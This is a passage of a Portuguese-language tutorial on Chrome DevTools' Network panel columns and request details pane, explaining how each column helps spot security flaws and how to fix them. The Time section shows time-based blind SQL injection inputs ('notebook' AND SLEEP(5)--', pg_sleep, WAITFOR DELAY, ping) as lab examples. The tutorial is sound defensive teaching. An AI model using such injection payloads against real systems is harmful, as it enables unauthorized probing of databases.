- **Como corrigir ou prevenir**: incluir `X-Content-Type-Options: nosniff` em 100% das respostas do servidor (**[REQUISITO]**), definir `Content-Type` explícito e seguro (**[REQUISITO]**) e substituir endpoints legados **JSONP** por **APIs JSON com CORS** devidamente configurado (**[RECOMENDAÇÃO]**).

##### Initiator

- **Nome do parâmetro**: **Initiator** (Iniciador da requisição).
- **O que significa**: coluna padrão que revela **quem ou o que causou o disparo daquela requisição de rede**, apontando o arquivo e o número exato da linha de código que originou a chamada.
- **Para que serve**: responder à pergunta mais importante de uma investigação forense ou depuração no front-end: *"Por que o navegador fez esta requisição e qual linha de código a disparou?"*.
- **Onde encontrar no DevTools**: painel **Network** → coluna padrão **Initiator**. (Dica valiosa: segurar a tecla **`Shift`** e passar o mouse sobre uma linha da tabela destaca em **verde** todas as requisições que *iniciaram* aquela requisição, e em **vermelho** todas as requisições que foram *iniciadas por ela*!).
- **Exemplo prático**:
  Os valores mais comuns exibidos na coluna **Initiator** são:
  - **`Parser` (ex.: `index.html:14`)**: o analisador HTML do navegador encontrou uma tag (`<script>`, `<img>`, `<link>`) na linha `14` de `index.html` e iniciou o download.
  - **`Script` (ex.: `auth.js:87`)**: uma função JavaScript na linha `87` do arquivo `auth.js` chamou `fetch()`, `XMLHttpRequest` ou manipulou o DOM para carregar o recurso. Ao clicar em `auth.js:87`, o DevTools abre a aba **Sources** exatamente naquela linha!
  - **`Redirect`**: a requisição foi disparada automaticamente pelo navegador ao seguir o cabeçalho `Location` de uma resposta `3xx` anterior.
  - **`Preflight`**: uma requisição `OPTIONS` disparada automaticamente pelo navegador antes de uma requisição CORS não simples.
  - **`Other`**: iniciada pelo próprio usuário digitando a URL na barra de endereços, clicando em um link ou recarregando a página.
- **Comportamento normal**: ativos iniciais têm `Initiator: Parser` (apontando para o HTML) e chamadas dinâmicas de API têm `Initiator` apontando para os scripts legítimos da aplicação.
- **O que seria considerado seguro**: todas as requisições sensíveis de API tendo como **Initiator** exclusivamente os módulos oficiais da própria aplicação.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Detecção de XSS ou Script de Terceiro Comprometido (Supply Chain Attack)**: você vê na tabela uma requisição enviando dados para um servidor externo ou para `/api/transferir`, e a coluna **Initiator** aponta para um script de anúncio externo (`ads-widget.js:1`), para uma extensão ou para `(index):1` (indicando um `<script>` inline injetado via **XSS** diretamente no HTML!).
  2. **Cadeia de Redirecionamentos Maliciosa**: múltiplas linhas seguidas com `Initiator: Redirect` passando por domínios intermediários de rastreamento ou *phishing*.
- **Como investigar o problema**: passe o mouse sobre o link na coluna **Initiator** para ver a **Call Stack (Pilha de Chamadas)** em um *tooltip*, ou clique na requisição e abra a sub-aba **Initiator** para ver a árvore completa (*Request initiator chain*), clicando no arquivo `:linha` para ler o código-fonte na aba **Sources**.
- **Como corrigir ou prevenir**: eliminar vulnerabilidades de XSS com sanitização e **CSP** (**[REQUISITO]**) e auditar/isolar scripts de terceiros para que não tenham acesso ao contexto de execução de páginas críticas (**[RECOMENDAÇÃO]**).

##### Initiator Address Space

- **Nome do parâmetro**: **Initiator Address Space** (Espaço de endereçamento IP do contexto iniciador).
- **O que significa**: coluna opcional par da coluna *Remote Address Space* (da especificação **Private Network Access — PNA**). Mostra a qual espaço de rede (`Public`, `Private` ou `Local`) pertence o **documento ou worker que disparou** a requisição.
- **Para que serve**: comparar o nível de privilégio de rede de **quem pediu** (*Initiator Address Space*) com o nível de rede de **quem recebeu** (*Remote Address Space*).
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Initiator Address Space**.
- **Exemplo prático**:
  ```text
  Name       | Initiator Address Space | Remote Address Space | Diagnóstico
  -----------|-------------------------|----------------------|----------------------------------------
  api/status | Public                  | Public               | Normal (Site na internet -> API na internet)
  login.cgi  | Public                  | Private              | ALERTA CRÍTICO! Site público tentando acessar IP 192.168.x.x da rede interna!
  ```
- **Comportamento normal**: idêntico ao espacio de endereço da página aberta na aba (`Public` para sites da internet; `Private` para sistemas da intranet corporativa; `Local` para aplicações em `localhost`).
- **O que seria considerado seguro**: nunca ocorrer transição de um `Initiator Address Space` menos privilegiado (`Public`) para um `Remote Address Space` mais privilegiado (`Private` ou `Local`) sem consentimento explícito do dispositivo local via cabeçalhos PNA.
- **O que poderia indicar uma vulnerabilidade**: um documento carregado da internet (`Initiator Address Space: Public`) ou um `<iframe>` de anúncio tentando fazer varredura de portas (*Port Scanning* via navegador) ou ataques CSRF contra serviços `Private` ou `Local`.
- **Como investigar o problema**: compare lado a lado **Initiator Address Space** e **Remote Address Space**; se houver disparidade (`Public` → `Private`/`Local`), clique no link da coluna **Initiator** para identificar o script responsável.
- **Como corrigir ou prevenir**: isolar sub-recursos não confiáveis e configurar serviços internos de rede privada para rejeitar requisições originadas de origens públicas **[REQUISITO]**.

##### Cookies

- **Nome do parâmetro**: **Cookies** (Quantidade de cookies enviados na requisição).
- **O que significa**: coluna opcional que exibe um **número inteiro** representando quantos cookies foram anexados e enviados pelo navegador no cabeçalho de requisição **`Cookie`** daquela chamada específica.
- **Para que serve**: verificar rapidamente em quais requisições o navegador está enviando credenciais de sessão/rastreamento e confirmar se requisições para subdomínios de ativos estáticos ou origens cruzadas estão enviando cookies desnecessariamente.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Cookies**.
- **Exemplo prático**:
  ```text
  Name          | Domain                    | Cookies | Análise
  --------------|---------------------------|---------|------------------------------------------------
  meus-pedidos  | api.loja-ficticia.test    | 2       | Envia session_id e csrf_token para a API
  logo.png      | static.loja-ficticia.test | 0       | Excelente: CDN estática sem tráfego de cookies
  ```
- **Comportamento normal**: chamadas autenticadas para o domínio da aplicação exibem o número de cookies aplicáveis àquele `Domain` e `Path`; chamadas para outros domínios sem credenciais ou para domínios estáticos isolados exibem `0` (ou vazio).
- **O que seria considerado seguro**:
  1. Cookies de sessão sendo enviados **apenas** para os endpoints necessários (graças a atributos `Domain` e `Path` restritos, ex.: não definir `Domain=.loja-ficticia.test` se o cookie só é necessário em `app.loja-ficticia.test`).
  2. Requisições `fetch()` para APIs de terceiros com `Cookies: 0` (ou seja, sem `credentials: 'include'`).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Escopo excessivo de Cookie (`Domain` amplo demais)**: ver que requisições para um subdomínio menos seguro (como `blog.loja-ficticia.test` ou `arquivos.loja-ficticia.test`) exibem `Cookies: 3`, enviando o cookie de sessão principal para um servidor WordPress secundário onde um XSS ou plugin vulnerável pode roubá-lo!
  2. **Credenciais vazando em CORS (`credentials: 'include'`)**: chamadas para domínios externos enviando cookies inesperadamente.
- **Como investigar o problema**: ative as colunas **Domain**, **Cookies** e **Set Cookies**; clique em qualquer linha com `Cookies > 0` e abra a sub-aba **Cookies** no painel de detalhes para ver exatamente quais cookies foram transmitidos.
- **Como corrigir ou prevenir**: usar o prefixo **`__Host-`** nos cookies de sessão (que proíbe o atributo `Domain`, travando o cookie exclusivamente no host exato que o criou) (**[RECOMENDAÇÃO]**) e servir ativos estáticos a partir de um domínio separado sem cookies (*cookieless domain*) (**[BOA PRÁTICA]**).

##### Set Cookies

- **Nome do parâmetro**: **Set Cookies** (Quantidade de cabeçalhos `Set-Cookie` recebidos na resposta).
- **O que significa**: coluna opcional que exibe um **número inteiro** indicando quantos cabeçalhos **`Set-Cookie`** o servidor enviou naquela resposta HTTP para criar, atualizar ou expirar cookies no navegador.
- **Para que serve**: localizar instantaneamente em uma lista de 200 requisições exatamente quais respostas definiram ou modificaram cookies de sessão, autenticação ou rastreamento (sem precisar usar filtros complexos).
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Set Cookies**.
- **Exemplo prático**:
  ```text
  Name          | Method | Status | Cookies | Set Cookies
  --------------|--------|--------|---------|------------
  login         | POST   | 200    | 0       | 2           <- Servidor criou 2 cookies no login!
  painel        | GET    | 200    | 2       | 0           <- Navegador enviou os 2 cookies criados
  logout        | POST   | 200    | 2       | 2           <- Servidor zerou/expirou os 2 cookies!
  ```
- **Comportamento normal**: apresenta valores maiores que zero principalmente em respostas de login, registro, alteração de idioma/consentimento, renovação de sessão (*refresh*) e logout.
- **O que seria considerado seguro**:
  - Após um `POST /login` bem-sucedido, ver `Set Cookies: 1` (ou `2`) definindo um novo identificador de sessão aleatório com `HttpOnly; Secure; SameSite=Lax` (ou `Strict`).
  - Após um `POST /logout`, ver `Set Cookies` sobrescrevendo o cookie com valor vazio e `Max-Age=0` ou `Expires` no passado (além de invalidar a sessão no banco/Redis do servidor!).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Session Fixation (Fixação de Sessão)**: o visitante já tinha `Cookies: 1` (`sid=AAA`) antes de logar; ao fazer `POST /login`, a coluna **Set Cookies** mostra `0`! Isso significa que o servidor **não trocou** o ID da sessão após a autenticação, permitindo que um atacante que conhecia o `sid=AAA` pré-login assuma a sessão autenticada.
  2. **Logout Inseguro (Apenas no Cliente ou sem Invalidar Cookie)**: o usuário clica em "Sair", mas não há nenhuma resposta com `Set Cookies` expirando o cookie `HttpOnly` nem chamada ao servidor para destruir a sessão.
- **Como investigar o problema**: ative a coluna **Set Cookies** e marque **Preserve log**; execute o login e o logout observando se ambos emitem `Set-Cookie` adequados e inspecione os atributos de cada cookie na sub-aba **Cookies**.
- **Como corrigir ou prevenir**: sempre emitir um novo `Set-Cookie` regenerando o ID de sessão no login (**[REQUISITO]**) e invalidar a sessão tanto no servidor quanto via `Set-Cookie: ...; Max-Age=0` (ou cabeçalho `Clear-Site-Data: "cookies"`) no logout (**[REQUISITO]**).

##### Size

- **Nome do parâmetro**: **Size** (Tamanho da transferência / tamanho do recurso ou origem de cache).
- **O que significa**: coluna padrão que informa quantos bytes foram transferidos pela rede para aquela requisição (**Transfer Size** — já comprimido, incluindo cabeçalhos HTTP) ou, quando o recurso não veio da rede, exibe entre parênteses a camada local que o forneceu: **`(memory cache)`**, **`(disk cache)`**, **`(prefetch cache)`** ou **`(ServiceWorker)`**. Quando a opção **Use large request rows** está ativa, exibe dois números: em cima o **Transfer Size** (comprimido na rede) e embaixo o **Resource Size** (tamanho real descomprimido do conteúdo).
- **Para que serve**:
  1. Avaliar a eficiência da compressão HTTP (`gzip`, `br`, `zstd`) e do cacheamento.
  2. Em segurança: identificar vazamentos de dados em respostas anormalmente grandes, verificar se endpoints privados foram armazenados indevidamente em `(disk cache)` e detectar ataques de canal lateral por tamanho.
- **Onde encontrar no DevTools**: painel **Network** → coluna padrão **Size**.
- **Exemplo prático**:
  ```text
  Name                | Status | Size (Transfer / Resource)
  --------------------|--------|---------------------------
  relatorio.json      | 200    | 14.2 kB / 96.5 kB         <- Comprimido com Brotli na rede
  logo.svg            | 200    | (disk cache)              <- Lido do disco sem usar a rede
  extrato-privado.json| 200    | (disk cache)              <- PERIGO! Dado bancário em cache no disco!
  ```
- **Comportamento normal**: ativos estáticos repetidos mostram `(memory cache)` ou `(disk cache)` (quando *Disable cache* está desmarcado), e chamadas dinâmicas mostram o tamanho em `B`, `kB` ou `MB`, onde o *Transfer Size* é significativamente menor que o *Resource Size* graças à compressão.
- **O que seria considerado seguro**:
  - Respostas com dados pessoais, financeiros ou de sessão **jamais** exibindo `(disk cache)` ou `(memory cache)` após o encerramento da sessão.
  - Respostas JSON com tamanho proporcional apenas aos registros exibidos na tela.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Exposição Excessiva de Dados (*Excessive Data Exposure*)**: uma tela que mostra apenas "3 comentários" recebe uma resposta `GET /api/comentarios` com `Size: 2.4 MB` porque o back-end enviou o cadastro completo de todos os usuários junto com os comentários.
  2. **Cacheamento Indevido de Dados Sensíveis**: ver `(disk cache)` na coluna **Size** para rotas autenticadas em computadores compartilhados.
  3. **Vulnerabilidade BREACH / CRIME (Oráculo de Compressão)**: quando um segredo (como um token CSRF) é refletido na mesma resposta HTTP comprimida (`gzip`/`br`) em que o atacante consegue injetar texto controlado, permitindo deduzir o segredo byte a byte observando variações de poucos bytes no **Transfer Size**!
- **Como investigar o problema**: ative **Use large request rows** nas configurações da aba Network para ver simultaneamente o tamanho transferido e o tamanho real descomprimido na coluna **Size**; clique no título da coluna **Size** para ordenar da maior resposta para a menor.
- **Como corrigir ou prevenir**: paginar e filtrar payloads JSON no servidor (**[REQUISITO]**), definir `Cache-Control: no-store` em respostas sensíveis (**[REQUISITO]**) e proteger tokens contra ataques de compressão com *masking* por requisição e cookies `SameSite` (**[RECOMENDAÇÃO]**). Veja mais detalhes na subseção `2.1.8`.

##### Time

- **Nome do parâmetro**: **Time** (Duração total da requisição e latência).
- **O que significa**: coluna padrão que exibe o tempo total decorrido (em milissegundos `ms` ou segundos `s`) desde o instante em que o navegador enfileirou a requisição até o momento em que terminou de receber o último byte da resposta. Com **Use large request rows** ativo, exibe o **Tempo Total** na linha superior e a **Latência / TTFB (*Time To First Byte*)** na linha inferior.
- **Para que serve**: identificar gargalos de performance no servidor ou na rede e — em segurança da informação — detectar **Time-Based Blind Vulnerabilities** (vulnerabilidades cegas baseadas em tempo) e **Timing Attacks** (ataques de temporização).
- **Onde encontrar no DevTools**: painel **Network** → coluna padrão **Time**.
- **Exemplo prático**:
  Durante um teste autorizado em laboratório (ex.: OWASP WebGoat ou PortSwigger Academy), o estudante testa um parâmetro de busca:
  ```text
  Name                                    | Status | Time
  ----------------------------------------|--------|--------
  busca?item=notebook                     | 200    | 45 ms   <- Tempo normal da consulta SQL
  busca?item=notebook' AND SLEEP(5)--     | 200    | 5.05 s  <- ALERTA! Time-Based Blind SQL Injection!
  ```
- **Comportamento normal**: respostas de cache levam `0–5 ms`; APIs rápidas levam `20–300 ms`; conexões persistentes como WebSockets ou *Server-Sent Events* exibem `Pending` enquanto permanecerem abertas.
- **O que seria considerado seguro**:
  - Endpoints sensíveis (como `/api/login` e `/api/recuperar-senha`) apresentando **tempo constante** (*constant-time response*), levando praticamente o mesmo número de milissegundos (ex.: `~250 ms`) tanto para um usuário que existe no banco (onde o servidor calcula o hash `Argon2id`/`bcrypt` da senha) quanto para um usuário que **não existe**!
- **O que poderia indicar uma vulnerabilidade**:
  1. **Enumeração de Usuários via Timing Attack**: ao tentar logar com `naoexiste@exemplo.test`, a coluna **Time** mostra `12 ms` (porque o `SELECT` não achou o usuário e retornou imediatamente sem rodar o `bcrypt`); ao tentar logar com `diretor@exemplo.test` (que existe), a coluna **Time** mostra `280 ms` (tempo do cálculo do `bcrypt`). Mesmo que a mensagem de erro seja idêntica, um atacante descobre todos os e-mails cadastrados medindo a coluna **Time**!
  2. **Blind SQL Injection / Blind Command Injection Baseado em Tempo**: comandos como `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'` ou `ping -c 5 127.0.0.1` refletindo exatamente o atraso solicitado na coluna **Time**.
  3. **ReDoS (Regular Expression Denial of Service)**: uma string malformada fazendo o servidor travar por `15 s` validando uma expressão regular vulnerável.
- **Como investigar o problema**: compare o valor da coluna **Time** (e o detalhamento na sub-aba **Timing → Waiting for server response / TTFB**) entre entradas válidas, entradas inexistentes e payloads de teste em laboratório.
- **Como corrigir ou prevenir**: em rotinas de login, quando o e-mail não existir no banco, executar um cálculo de hash fictício (*dummy hash comparison* com `bcrypt`/`Argon2id`) antes de retornar `401` para igualar o tempo de resposta (**[RECOMENDAÇÃO]**), e usar *Prepared Statements* para eliminar SQL Injection (**[REQUISITO]**).

##### Priority

- **Nome do parâmetro**: **Priority** (Prioridade de busca do recurso atribuída pelo navegador).
- **O que significa**: coluna opcional que mostra o nível de urgência que o motor do Chrome (**Blink**) atribuiu para o download daquele recurso (`Highest`, `High`, `Medium`, `Low`, `Lowest`), influenciando a ordem de envio e a alocação de largura de banda nos fluxos multiplexados do **HTTP/2** e **HTTP/3** (RFC 9218 — *Extensible Prioritization Scheme for HTTP*). Com **Use large request rows** ativo, pode exibir a prioridade final em cima e a prioridade inicial embaixo (ex.: uma imagem começa como `Low` e sobe para `High` quando entra na área visível da tela — *viewport*).
- **Para que serve**: otimizar o carregamento do caminho crítico de renderização (*Critical Rendering Path* e **LCP — Largest Contentful Paint**) e verificar o efeito do atributo HTML `fetchpriority="high|low|auto"`.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Priority**.
- **Exemplo prático**:
  - Documento HTML principal (`Doc`) e CSS crítico: **`Highest`**.
  - Scripts síncronos no `<head>` e chamadas `fetch()`/`XHR`: **`High`**.
  - Scripts com `async` ou `defer` e imagens fora da tela inicial: **`Low`** (ou **`Lowest`** para *beacons*/*pings*).
- **Comportamento normal**: recursos essenciais para desenhar a página têm prioridade `Highest`/`High`, enquanto telemetria, *prefetch* e imagens inferiores têm `Low`/`Lowest`.
- **O que seria considerado seguro**: scripts de segurança ou de inicialização crítica carregados com prioridade adequada, sem que recursos pesados de terceiros monopolizem a conexão com prioridade `Highest`.
- **O que poderia indicar uma vulnerabilidade**:
  - Em ataques de negação de serviço na camada de aplicação (**HTTP/2 Priority / Stream Manipulation**) ou quando dezenas de recursos pesados não essenciais são marcados com `fetchpriority="high"`, degradando a disponibilidade e o carregamento da interface principal.
- **Como investigar o problema**: ative a coluna **Priority** e verifique se ativos secundários ou de terceiros estão competindo com prioridade `Highest` ou `High` contra as chamadas principais da aplicação.
- **Como corrigir ou prevenir**: utilizar `loading="lazy"` e `fetchpriority="low"` em imagens e scripts não críticos, reservando `fetchpriority="high"` apenas para o elemento principal da tela **[BOA PRÁTICA]**.

##### Connection ID

- **Nome do parâmetro**: **Connection ID** (Identificador interno do soquete/conexão TCP ou QUIC no navegador).
- **O que significa**: coluna opcional que exibe um número identificador único (atribuído internamente pelo Chrome, como `14205`, `14209`) para cada conexão de transporte (**soquete TCP** no HTTP/1.1 e HTTP/2, ou **sessão QUIC/UDP** no HTTP/3) aberta pelo navegador.
- **Para que serve**: comprovar visualmente a **reutilização de conexão (*Keep-Alive*)** no HTTP/1.1 e a **multiplexação** no HTTP/2 e HTTP/3 (onde dezenas de requisições simultâneas para o mesmo domínio compartilham exatamente o **mesmo número de Connection ID**!) ou a **coalescência de conexão (*HTTP/2 Connection Coalescing*)** entre subdomínios que compartilham o mesmo IP e certificado TLS.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Connection ID**.
- **Exemplo prático**:
  Comparando um servidor antigo em `http/1.1` com um servidor moderno em `h2`:
  ```text
  # Em HTTP/1.1 (navegador abre até 6 conexões TCP paralelas por host):
  img1.png | Protocol: http/1.1 | Connection ID: 501
  img2.png | Protocol: http/1.1 | Connection ID: 502
  img3.png | Protocol: http/1.1 | Connection ID: 503

  # Em HTTP/2 ou HTTP/3 (todas as requisições usam 1 única conexão multiplexada!):
  img1.png | Protocol: h2       | Connection ID: 890
  img2.png | Protocol: h2       | Connection ID: 890
  img3.png | Protocol: h2       | Connection ID: 890
  ```
- **Comportamento normal**: em `h2` e `h3`, quase todas as requisições para o mesmo domínio apresentam o mesmo **Connection ID** (exceto quando há uma requisição *credentialed* e outra *anonymous* CORS/sem credenciais, que o navegador separa em conexões distintas por segurança).
- **O que seria considerado seguro**: reutilização eficiente de conexão em `h2`/`h3` e separação adequada de conexões autenticadas vs. anônimas pelo navegador.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Cross-Site Leaks (XS-Leaks) via Connection Pool / Timing**: se o mesmo **Connection ID** (ou *pool* de conexões) é reutilizado, o tempo da primeira requisição sem precisar de novo *handshake* TCP+TLS revela se o navegador já havia se conectado àquele servidor antes (motivo pelo qual os navegadores modernos aplicam **Network Partitioning** — particionamento de conexões de rede por *top-level site*).
  2. **Desconexões forçadas a cada requisição em HTTP/1.1 (`Connection: close`)**: cada requisição recebe um **Connection ID** diferente e paga o custo de um novo *handshake* TCP e TLS, facilitando ataques de **exaustão de conexões e CPU TLS** no servidor.
- **Como investigar o problema**: ative lado a lado as colunas **Protocol**, **Domain**, **Remote Address** e **Connection ID** para observar quantas conexões reais foram abertas para carregar a página.
- **Como corrigir ou prevenir**: habilitar **HTTP/2 (`h2`)** e **HTTP/3 (`h3`)** com *Keep-Alive* configurado adequadamente no servidor web ou proxy reverso **[RECOMENDAÇÃO]**.

##### Waterfall

- **Nome do parâmetro**: **Waterfall** (Gráfico em cascata da linha do tempo das requisições).
- **O que significa**: última coluna padrão à direita da tabela de requisições. Exibe uma barra horizontal colorida posicionada proporcionalmente no tempo para cada requisição, onde cada cor dentro da barra representa uma fase específica da transação de rede:
  - **Branco / Cinza claro**: *Queueing* / *Stalled* (na fila do navegador aguardando conexão livre).
  - **Verde-azulado (*Teal*)**: *DNS Lookup* (resolução de nome DNS).
  - **Laranja**: *Initial Connection* (*Handshake* TCP de 3 vias).
  - **Roxo**: *SSL / TLS* (*Handshake* criptográfico TLS).
  - **Verde**: *Waiting (TTFB — Time To First Byte)* (tempo aguardando o servidor processar e responder o primeiro byte).
  - **Azul**: *Content Download* (tempo transferindo o corpo da resposta pela rede).
- **Para que serve**: visualizar instantaneamente o paralelismo entre requisições, gargalos de bloqueio de renderização, reutilização de conexões (barras sem os trechos laranja/roxo de TCP/TLS) e qual etapa exata (DNS, Rede, TLS, Servidor ou Download) atrasou uma requisição.
- **Onde encontrar no DevTools**: painel **Network** → última coluna à direita (**Waterfall**). Passar o mouse sobre qualquer barra colorida abre um *tooltip* com os tempos exatos em milissegundos de cada fase (o mesmo gráfico da sub-aba **Timing**, detalhada na subseção `2.1.6`). Clicar no cabeçalho **Waterfall** permite ordenar as requisições por *Start Time*, *Response Time*, *End Time*, *Total Duration* ou *Latency*.
- **Exemplo prático**:
  ```text
  Name        | Time   | Waterfall
  ------------|--------|----------------------------------------------------
  index.html  | 180 ms | [DNS][TCP][TLS][===TTFB (Verde)===][Download(Azul)]
  app.js      | 95 ms  |                [===TTFB===][====Download(Azul)====] <- Reusou TCP/TLS!
  login       | 3.2 s  |                            [=======TTFB Longo=====] <- Servidor demorou!
  ```
- **Comportamento normal**: a primeira requisição para um domínio exibe as fases de DNS, TCP e TLS; as requisições seguintes no mesmo **Connection ID** (`h2`/`h3`) começam diretamente na barra verde (*Waiting / TTFB*) e rodam em paralelo.
- **O que seria considerado seguro**: barras de **Waterfall** sem atrasos anômalos de *TTFB* que dependam de segredos internos (prevenção de *Timing Attacks*) e sem cadeias longas de redirecionamentos sequenciais.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Barra Verde (*Waiting / TTFB*) anormalmente longa em endpoints específicos**: indica processamento pesado no servidor (possível **ReDoS**, **Blind SQLi com `SLEEP`**, **SSRF** aguardando *timeout* de um IP interno inacessível na rede do servidor, ou falta de índice em consulta de banco que permite **DoS de camada de aplicação — L7 DoS**).
  2. **Escada de conexões bloqueadas (*Head-of-Line Blocking* severo)**: dezenas de requisições ficando brancas/cinzas (*Stalled*) por vários segundos porque 6 conexões HTTP/1.1 ficaram presas em *long polling* ou streams lentos.
- **Como investigar o problema**: passe o mouse sobre a barra na coluna **Waterfall** da requisição suspeita para ver qual cor domina o tempo total; se for o trecho **verde (*Waiting for server response*)**, o atraso aconteceu dentro do servidor de back-end (ou em uma chamada que o back-end fez para o banco de dados ou para outro servidor via SSRF!).
- **Como corrigir ou prevenir**: definir *timeouts* curtos para consultas de banco e chamadas externas no servidor (**[REQUISITO]**), usar processamento assíncrono em filas para tarefas pesadas (**[BOA PRÁTICA]**) e habilitar HTTP/2 ou HTTP/3 (**[RECOMENDAÇÃO]**).

##### Response Headers (Colunas personalizadas)

- **Nome do parâmetro**: **Response Headers (Custom Header Columns)** (Colunas personalizadas de cabeçalhos de resposta HTTP).
- **O que significa**: funcionalidade que permite transformar **qualquer cabeçalho HTTP de resposta** (como `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Access-Control-Allow-Origin`, `Cache-Control`, `Server`, `X-Powered-By`, `ETag` ou `Vary`) em uma **coluna fixa diretamente na tabela de requisições** da aba Network!
- **Para que serve**: auditar a presença, a ausência ou o valor exato de headers de segurança e de cache em **todas as requisições da página de uma só vez**, sem precisar clicar em 100 requisições individualmente para abrir a aba *Headers* de cada uma!
- **Onde encontrar no DevTools**: clique com o botão direito sobre qualquer cabeçalho de coluna na tabela **Network** → posicione o mouse em **Response Headers** → selecione um dos cabeçalhos pré-listados (`Cache-Control`, `Connection`, `Content-Encoding`, `Content-Length`, `ETag`, `Keep-Alive`, `Last-Modified`, `Server`, `Vary`) ou clique em **Manage Header Columns...** → **Add custom header** para adicionar `Content-Security-Policy`, `Strict-Transport-Security`, `Access-Control-Allow-Origin`, `X-Content-Type-Options`, `X-Powered-By`, etc.
- **Exemplo prático**:
  Em uma prova prática ou auditoria de segurança, você adiciona as colunas personalizadas `Access-Control-Allow-Origin`, `Cache-Control` e `X-Powered-By`. A tabela da aba Network passa a mostrar instantaneamente:
  ```text
  Name          | Status | Access-Control-Allow-Origin | Cache-Control       | X-Powered-By
  --------------|--------|-----------------------------|---------------------|---------------
  index.html    | 200    |                             | no-cache            |
  perfil        | 200    | *                           | public, max-age=3600| Express
  extrato.json  | 200    | https://atacante.test       |                     | PHP/5.6.40
  ```
  Em apenas um olhar na tabela acima, você já identificou **4 vulnerabilidades graves**: CORS aberto (`*` e origem refletida), resposta de perfil autenticada com cache `public` e exposição de versões antigas (`Express`, `PHP/5.6.40`)!
- **Comportamento normal**: exibe o valor textual do cabeçalho quando presente na resposta daquela linha, ou deixa a célula em branco quando a resposta não inclui aquele cabeçalho.
- **O que seria considerado seguro**:
  - Colunas `Server` e `X-Powered-By` em branco (ou sem números de versão de software/SO).
  - Coluna `X-Content-Type-Options` exibindo `nosniff` em todas as linhas.
  - Coluna `Cache-Control` exibindo `no-store` (ou `private, no-cache`) em todas as rotas de API autenticadas.
  - Coluna `Access-Control-Allow-Origin` exibindo apenas origens confiáveis explícitas (nunca `*` em rotas privadas nem refletindo origens arbitrárias).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Banner Grabbing / Exposição de Tecnologia**: coluna `Server` mostrando `Apache/2.4.49 (Unix)` (versão famosa vulnerável a Path Traversal/RCE CVE-2021-41773!) ou `X-Powered-By: ASP.NET` / `PHP/7.1.0`.
  2. **Inconsistência de Headers entre Microsserviços**: notar pela coluna personalizada que as rotas `/api/v1/*` têm headers de segurança, mas as rotas `/api/v2/*` (servidas por outro container) deixam todas as colunas de headers de segurança em branco!
- **Como investigar o problema**: antes de iniciar qualquer auditoria de segurança na aba Network, abra `Response Headers → Manage Header Columns...` e adicione os headers `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `Access-Control-Allow-Origin`, `Cache-Control`, `Server` e `X-Powered-By` **[BOA PRÁTICA]**.
- **Como corrigir ou prevenir**: padronizar a injeção de headers de segurança e a remoção de headers de versão (`server_tokens off;` no Nginx; `app.disable('x-powered-by')` e `helmet()` no Express/Node.js) diretamente no **API Gateway / Proxy Reverso** para cobrir todos os serviços de forma uniforme **[RECOMENDAÇÃO]**.

---

<a id="s2-1-5"></a>
#### 2.1.5 Painel de detalhes da requisição

Ao clicar no nome de uma requisição na tabela de requisições (*Requests table*) do painel **Network**, o DevTools abre o **painel de detalhes** ao lado (ou abaixo, conforme o layout). Esse painel é organizado em **abas** — as mais comuns são **Headers**, **Payload**, **Preview**, **Response**, **Initiator**, **Timing** e **Cookies** — e, conforme o tipo de recurso, aparecem abas específicas como **EventStream** (fluxos de eventos do servidor) e **Messages** (WebSocket). Algumas abas só aparecem quando fazem sentido: **Payload** só aparece quando há parâmetros de *query string* ou corpo; **Cookies** só aparece quando a requisição envia ou recebe cookies; **Messages** só existe para conexões WebSocket.

> [!NOTE]
> **[Varia por versão]** O conjunto de abas, a ordem e alguns rótulos mudam entre versões do Chrome. Por exemplo, a aba **Payload** foi separada da aba **Headers** em versões relativamente recentes (antes, *Query String Parameters* e *Form Data* apareciam no fim da aba Headers), e a caixa **Raw** substituiu o antigo link **view source** nos cabeçalhos em várias versões. Versões recentes também podem exibir abas especializadas, como **Device bound sessions** (sessões vinculadas ao dispositivo), apenas para requisições relevantes. Sempre confira a documentação oficial em developer.chrome.com/docs/devtools/network/reference.

Visão geral das abas:

| Aba | Conteúdo principal | Uso típico em segurança |
|---|---|---|
| **Headers** | Seção *General*, *Response Headers*, *Request Headers* (e, quando houver, *Early Hints Headers*) | Verificar headers de segurança, `Set-Cookie`, `Authorization`, `Server`, CORS |
| **Payload** | *Query String Parameters*, *Form Data*, *Request Payload* | Verificar se senhas/tokens trafegam em local indevido |
| **Preview** | Visualização renderizada (imagem, HTML, árvore JSON) | Inspecionar rapidamente respostas JSON grandes |
| **Response** | Corpo bruto da resposta | Procurar dados sensíveis, stack traces, comentários |
| **Initiator** | Pilha de chamadas e cadeia de iniciadores | Descobrir qual script (talvez de terceiro) disparou a requisição |
| **Timing** | Fases da requisição (fila, DNS, conexão, TLS, espera, download) | Diagnóstico de desempenho; identificar conexão reutilizada |
| **Cookies** | *Request Cookies* e *Response Cookies*, inclusive bloqueados | Auditar atributos `Secure`, `HttpOnly`, `SameSite` |
| **EventStream** | Eventos de SSE (*Server-Sent Events*) e streams | Ver dados enviados continuamente pelo servidor |
| **Messages** | Quadros (*frames*) WebSocket enviados e recebidos | Ver dados trafegados em tempo real via WebSocket |

##### Aba Headers

- **O que significa**: é a aba que mostra os **metadados HTTP** da transação: a seção **General** (resumo da requisição), os **Response Headers** (cabeçalhos devolvidos pelo servidor) e os **Request Headers** (cabeçalhos enviados pelo navegador). Quando o servidor envia uma resposta informativa **103 Early Hints**, pode aparecer também a seção **Early Hints Headers**.
